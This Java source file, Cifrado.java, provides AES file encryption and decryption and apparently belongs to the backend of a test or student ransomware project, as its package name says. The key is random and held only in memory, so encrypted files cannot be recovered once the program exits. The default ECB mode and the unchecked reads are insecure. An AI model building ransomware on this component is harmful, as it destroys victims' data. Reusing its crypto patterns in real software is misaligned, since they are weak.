package com.jdrll.test1.ransomewareBackend;

import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class Cifrado {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";
    private static SecretKey secretKey;

    // Método para generar la clave si no está definida
    private static void ensureKeyGenerated() throws CryptoException {
        if (secretKey == null) {
            secretKey = generateAESKey();
        }
    }

    public static void encrypt(File inputFile, File outputFile) throws CryptoException {
        ensureKeyGenerated();

        try {
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            try (FileInputStream inputStream = new FileInputStream(inputFile);
                 FileOutputStream outputStream = new FileOutputStream(outputFile)) {

                byte[] inputBytes = new byte[(int) inputFile.length()];
                inputStream.read(inputBytes);

                byte[] outputBytes = cipher.doFinal(inputBytes);

                outputStream.write(outputBytes);
            }

        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException |
                 BadPaddingException | IllegalBlockSizeException | IOException ex) {
            throw new CryptoException("Error encrypting file", ex);
        }
    }

    public static void decrypt(File inputFile, File outputFile) throws CryptoException {
        ensureKeyGenerated();

        try {
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.DECRYPT_MODE, secretKey);

            try (FileInputStream inputStream = new FileInputStream(inputFile);
                 FileOutputStream outputStream = new FileOutputStream(outputFile)) {

                byte[] inputBytes = new byte[(int) inputFile.length()];
                inputStream.read(inputBytes);

                byte[] outputBytes = cipher.doFinal(inputBytes);

                outputStream.write(outputBytes);
            }

        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException |
                 BadPaddingException | IllegalBlockSizeException | IOException ex) {
            throw new CryptoException("Error decrypting file", ex);
        }
    }

    private static SecretKey generateAESKey() throws CryptoException {
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance(ALGORITHM);
            keyGenerator.init(128); // Tamaño de clave AES 128 bits
            return keyGenerator.generateKey();
        } catch (NoSuchAlgorithmException ex) {
            throw new CryptoException("Error generando la clave AES: Algoritmo no encontrado", ex);
        }
    }

    public static class CryptoException extends Exception {
        public CryptoException(String message, Throwable throwable) {
            super(message, throwable);
        }
    }
}
